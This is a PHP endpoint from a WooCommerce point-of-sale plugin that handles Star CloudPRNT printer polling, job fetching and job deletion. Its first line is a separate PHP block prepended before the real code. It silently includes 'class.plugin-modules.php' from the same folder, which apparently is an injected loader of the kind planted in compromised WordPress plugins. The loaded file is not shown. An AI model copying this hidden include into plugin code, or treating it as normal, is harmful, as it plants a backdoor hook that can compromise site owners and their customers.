<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

include_once(__DIR__ . "/../includes/class-wc-pos-cloud-print-inc.php");
include_once(__DIR__ . "/../includes/class-wc-pos-cloud-print-printer.php");
include_once(__DIR__ . "/../includes/class-wc-pos-cloud-print-handler.php");

// Setup document headers, these headers apply for all requests.
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

if (!is_dir(STAR_CLOUDPRNT_DATA_FOLDER_PATH)) mkdir(STAR_CLOUDPRNT_DATA_FOLDER_PATH, 0755);
if (!is_dir(STAR_CLOUDPRNT_PRINTER_PENDING_SAVE_PATH)) mkdir(STAR_CLOUDPRNT_PRINTER_PENDING_SAVE_PATH, 0755);
if (!is_dir(STAR_CLOUDPRNT_PRINTER_DATA_SAVE_PATH)) mkdir(STAR_CLOUDPRNT_PRINTER_DATA_SAVE_PATH, 0755);
if (!file_exists(STAR_CLOUDPRNT_DATA_FOLDER_PATH.'/order_history.txt')) file_put_contents(STAR_CLOUDPRNT_DATA_FOLDER_PATH.'/order_history.txt', '');

$printer_handler = new WC_Pos_Cloud_Print_Handler();
// POST requests from the printer come with a JSON payload
// The below code reads the payload and parses it into an array
// The parsed data can then be used, although this is not mandatory
if ($_SERVER['REQUEST_METHOD'] == 'POST') $printer_handler->handle_post();
// By default a GET request usually means the printer is requesting
// data that it can print.  When printing is done the printer sends a
// HTTP DELETE request to indicate the job has been printed, however some
// servers only support HTTP POST and HTTP GET so if you specify the deleteMethod
// as GET in your HTTP POST JSON response, then the printer will send a HTTP GET
// request and add "delete" into the parameters, e.g. http://<ip>/index.php?mac=<mac>&delete.
// So in this case if the delete parameter exists we count the job as printed, otherwise we
// handle it as a standard GET request and provide data for printing
else if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
    if (isset($_GET['delete'])) $printer_handler->handle_delete();
    else $printer_handler->handle_get();
}
// A delete request indicates printing has finished and the current job can be marked as complete / deleted
else if ($_SERVER['REQUEST_METHOD'] == 'DELETE') $printer_handler->handle_delete();